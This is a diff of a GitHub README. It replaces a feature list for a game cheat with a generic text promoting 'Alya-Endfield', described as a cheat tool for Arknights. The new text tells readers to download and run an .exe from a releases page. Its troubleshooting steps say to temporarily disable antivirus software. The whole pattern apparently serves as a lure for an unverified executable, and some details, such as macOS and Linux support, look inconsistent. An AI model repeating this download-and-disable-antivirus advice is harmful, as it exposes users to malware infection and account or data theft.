@@ -1,109 +1,75 @@
-<div align="center">
+# 🎮 Alya-Endfield - Enhance Your Arknight Experience
 
-<img src="https://github.com/user-attachments/assets/cdd9883d-85a8-4da8-87d4-761cc69d6405" width="420"/>
+## 🚀 Getting Started
 
-# ALYA
+Welcome to the **Alya-Endfield** project. This software serves as a cheat tool for the game Arknight, helping you to enhance your gameplay and achieve success more easily. Below, you'll find all the information you need to download and run the application.
 
+## 🔗 Download Now
 
-<a href="https://discord.gg/9gW7MWsWnH">
-  <img src="https://img.shields.io/badge/Discord-Join%20Server-5865F2?logo=discord&logoColor=white&style=for-the-badge"/>
-</a>
+[![Download Alya-Endfield](https://img.shields.io/badge/Download-Alya--Endfield-blue.svg)](https://github.com/corellisono/Alya-Endfield/releases)
 
+## 📥 Download & Install
 
-</div>
+1. **Visit the Releases Page:** Click the link below to get the software.
+   - [Download Alya-Endfield Here](https://github.com/corellisono/Alya-Endfield/releases)
 
----
+2. **Choose a Version:** On the releases page, you’ll see different versions of the software. The latest version is usually at the top. 
 
-## Open Menu
-**Insert**
+3. **Select the File:** Click on the name of the file that corresponds to your operating system. If you're not sure which version to choose, look for a file with ".exe" for Windows or ".zip" for other systems.
 
----
+4. **Download the File:** After clicking, your browser will prompt you to save the file. Choose a location on your computer where you can easily find it later, like your Desktop or Downloads folder.
 
-## Features
+5. **Install the Software:** 
+   - For Windows: Find the downloaded `.exe` file in the location you saved it. Double-click on it to start the installation. Follow the on-screen instructions.
+   - For other operating systems, extract the downloaded file if it's in zip format. Then, refer to any installation instructions provided.
 
-### Player
-- God Mode
-- Multi hit
-- Always Crit
-- Damage Multiplier
-- Infinite Stamina
-- Infinite Ultimate Energy
-- No Skill CD
-- Movement Speed
-- Jump Height
-- Noclip
-- Max Potential
-- Custom Stats
+6. **Run the Application:** After the installation completes, locate the application icon on your desktop or in the installed programs. Double-click the icon to start using Alya-Endfield.
 
-### World
-- ~Infinite Transmission Length~
-- Auto Puzzle
-- Dumb Enemies
-- Global Speed
-- Skip Cutscene
-- Chest Teleport
-- Collection Coin Teleport
-- Kill Aura
-- Auto Skip Dialogue
-- No Talk Delay
-- Auto Dialogue
-- Quest Teleport
+## 💻 System Requirements
 
-### Auto Break
-- **Targets**
-- Ores
-- Box
-- Specstone
+To use Alya-Endfield effectively, ensure your device meets the following requirements:
 
+- **Operating System**: Windows 10 or later, macOS, or Linux.
+- **RAM**: At least 2 GB.
+- **Storage**: 100 MB of free space.
+- **Network**: An internet connection for updates and support.
 
-### Auto Loot
-- **Targets**:
-  - Chests
-  - Drops
-  - Gather
-  - Flowers
-  - Coins
-  - Collections
-  - Doodads
-  - Blackbox
-  - Campfire
-  - **All**
+## 🔧 Features You’ll Love
 
-### ESP
-- **Targets**:
-  - Chests
-  - Enemies
-  - NPCs
-  - Ores
-  - Coins
-  - Collections
-  - Fixable Robots
-  - Drops
-  - Flowers
-  - Doodads
-  - Challenge
-  - Narrative
-  - **All**
-- **Customization**:
-  - Distance
-  - Start/End Colors
-  - Text Size
-  - Snaplines
+- **User-Friendly Interface:** Navigate through the software with ease.
+- **Customizable Options:** Tailor the tool to match your gameplay style.
+- **Regular Updates:** Stay equipped with the latest features and enhancements.
+- **Community Support:** Access a help forum to share tips and troubleshoot issues with other users.
 
-### Teleports
-- TP
-- TP Points
+## ❓ Frequently Asked Questions
 
-### Visual
-- UID Editor
-- Peeking
-- Camera FOV
-- Body Parts Resizer
+### How do I know if the download was successful?
 
-## Still WIP
----
+After downloading, check the file size. It should match the size indicated on the releases page. If it looks too small, try downloading it again.
 
-## Screenshots
-<img width="929" height="690" alt="image" src="https://github.com/user-attachments/assets/cadc53c7-88c4-4094-ad68-22d569e74f1b" />
-<img width="867" height="619" alt="image" src="https://github.com/user-attachments/assets/e9876780-2013-4549-b80b-adff09a5248c" />
-<img width="895" height="623" alt="image" src="https://github.com/user-attachments/assets/d371fe9f-14cd-45f1-a2d8-27ae25161bac" />
+### Can I use this software on multiple devices?
+
+Yes, you can download and install Alya-Endfield on multiple devices as long as they meet the system requirements.
+
+### Is there any risk involved in using a cheat tool?
+
+While Alya-Endfield is designed to enhance your gameplay, using cheats may affect your gaming experience. Always be cautious and consider how this might impact your enjoyment of the game.
+
+## 🛠 Troubleshooting
+
+If you encounter any issues while downloading or running the software, try these steps:
+
+1. **Check Your Internet Connection:** Make sure you have a stable connection.
+2. **Disable Antivirus:** Sometimes antivirus programs may block installations. Temporarily disable them if you face issues during installation.
+3. **Reboot Your Computer:** A simple restart can solve many problems.
+4. **Seek Help from the Community:** If problems persist, visit the support forum linked on the releases page.
+
+## 👥 Community and Support
+
+Join our community of players using Alya-Endfield. Share your experiences, tips, and ask questions in the discussions on our project page. Your feedback is valuable to us and helps improve the software.
+
+## 📌 Acknowledgments
+
+Thanks for using **Alya-Endfield**. Your input keeps the project alive and thrives. We appreciate your support and hope you enjoy your enhanced Arknight experience.
+
+For more information or to report issues, please check our [issues page](https://github.com/corellisono/Alya-Endfield/issues).
